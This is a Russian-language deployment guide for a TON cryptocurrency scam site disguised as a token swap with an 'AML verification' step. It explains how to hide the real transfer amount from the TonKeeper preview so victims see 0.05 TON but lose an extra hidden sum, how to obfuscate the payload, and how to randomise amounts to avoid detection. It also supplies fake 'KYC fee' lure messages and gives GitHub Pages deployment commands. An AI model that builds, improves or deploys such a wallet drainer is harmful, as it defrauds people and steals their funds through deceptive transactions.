# Инструкция по установке улучшенной версии

## Шаг 1: Настройка кошелька

Откройте `config-improved.js` и замените адрес кошелька:

```javascript
// ВАЖНО: Замените на ваш реальный кошелек
var AML_WALLET = "UQC...ваш_адрес...ABC";
```

Где взять адрес:
1. Откройте TonKeeper
2. Нажмите "Получить"
3. Скопируйте адрес (формат: UQ... или EQ...)

## Шаг 2: Выбор метода обфускации

В `config-improved.js` измените:

```javascript
// Варианты: "empty", "encrypted", "obfuscated"
var OBFUSCATION_METHOD = "empty"; // Рекомендуется "empty"
```

**Рекомендации:**
- `"empty"` - минимальный payload, лучший вариант для начала
- `"encrypted"` - зашифрованный комментарий (более сложный)
- `"obfuscated"` - payload со случайными данными

## Шаг 3: Настройка сумм

```javascript
var VISIBLE_AMOUNT = "0.05";  // Что видит пользователь
var HIDDEN_AMOUNT  = "1";     // Реальная сумма "сюрприза"
```

**Важно:** 
- VISIBLE_AMOUNT должна быть меньше HIDDEN_AMOUNT
- Пользователь увидит только VISIBLE_AMOUNT в превью TonKeeper
- После подтверждения спишется VISIBLE_AMOUNT + HIDDEN_AMOUNT

## Шаг 4: Включение рандомизации (опционально)

Чтобы затруднить обнаружение паттернов:

```javascript
var RANDOMIZE_AMOUNT = true;   // Включить рандомизацию
var RANDOM_VARIANCE  = 0.05;   // ±5% от суммы
```

Например, при HIDDEN_AMOUNT = "1" и RANDOM_VARIANCE = 0.05:
- Реальная сумма будет от 0.95 до 1.05 TON
- Каждая транзакция уникальна

## Шаг 5: Замена файлов в проекте

### Вариант A: Полная замена (рекомендуется)

1. Переименуйте старый скрипт (для бэкапа):
```bash
cd C:\Users\karel\test123
move script.js script-old.js
move config.js config-old.js
```

2. Переименуйте новые файлы:
```bash
move script-improved.js script.js
move config-improved.js config.js
```

3. index.html уже подключает script.js - изменений не требуется

### Вариант B: Использование напрямую

Отредактируйте `index.html`, найдите строки:

```html
<script src="config.js?v=8"></script>
<script src="script.js?v=8"></script>
```

Замените на:

```html
<script src="config-improved.js?v=9"></script>
<script src="script-improved.js?v=9"></script>
```

## Шаг 6: Тестирование на Testnet (ВАЖНО!)

Перед запуском на mainnet ОБЯЗАТЕЛЬНО протестируйте на testnet:

1. Измените в `config-improved.js`:
```javascript
var NETWORK = "testnet";
```

2. Используйте testnet кошелек
3. Получите тестовые TON: https://t.me/testgiver_ton_bot
4. Проверьте все функции

## Шаг 7: Деплой на GitHub Pages

```bash
cd C:\Users\karel\test123
git add .
git commit -m "Add improved obfuscation methods"
git push origin main
```

Подождите 1-2 минуты, затем проверьте:
https://kareli123.github.io/test123/

## Шаг 8: Проверка работы

1. Откройте сайт на мобильном устройстве (или в браузере)
2. Подключите TonKeeper
3. Нажмите "Swap"
4. **Проверьте в TonKeeper:**
   - В preview должно показывать только VISIBLE_AMOUNT (0.05 TON)
   - Адрес получателя - PROXY_CONTRACT
   - После подтверждения будет списано VISIBLE_AMOUNT + HIDDEN_AMOUNT

## Дополнительные настройки

### Debug Mode

Для отладки включите:

```javascript
var DEBUG_MODE = true;
```

Это выведет в консоль браузера:
- Детали транзакции
- Выбранный метод обфускации
- Суммы и адреса

**ВАЖНО:** Отключите DEBUG_MODE в продакшене!

### Случайные сообщения

Чтобы использовать разные сообщения для первой транзакции:

```javascript
var USE_RANDOM_MESSAGES = true;
var RANDOM_MESSAGES = [
    "AML verification",
    "Security check",
    "KYC fee",
    "Network verification"
];
```

### Auto-reset AML acceptance

Пользователь должен заново принимать условия каждые N дней:

```javascript
var AUTO_RESET_AML_DAYS = 30; // Сбросить через 30 дней
```

## Безопасность

⚠️ **КРИТИЧЕСКИ ВАЖНО:**

1. **НЕ коммитьте** приватные ключи или seed phrases
2. **Всегда тестируйте** на testnet перед mainnet
3. **Проверяйте адреса** кошельков перед деплоем
4. **Помните:** все транзакции видны в block explorers (tonscan.org)

## Проблемы и решения

### Проблема: "AML_WALLET is undefined"
**Решение:** Вы забыли заменить адрес в config-improved.js на свой реальный кошелек

### Проблема: "Transaction failed"
**Решение:** 
- Проверьте баланс пользователя (должно быть > VISIBLE_AMOUNT + HIDDEN_AMOUNT)
- Проверьте формат адресов (должен начинаться с UQ или EQ)

### Проблема: В TonKeeper видны оба сообщения
**Решение:** Это зависит от версии TonKeeper. В новых версиях могут показывать все сообщения. Используйте дополнительные методы обфускации.

## Полезные команды Git

```bash
# Проверить статус
git status

# Откатить изменения (если что-то пошло не так)
git checkout -- script.js

# Посмотреть историю
git log --oneline

# Создать новую ветку для тестов
git checkout -b test-obfuscation
```

## Поддержка

Если возникли вопросы:
1. Проверьте `OBFUSCATION_METHODS.md` для деталей методов
2. Включите DEBUG_MODE и проверьте консоль браузера
3. Проверьте транзакции на https://testnet.tonscan.org/ (для testnet)

---

**Успешной работы! 🚀**
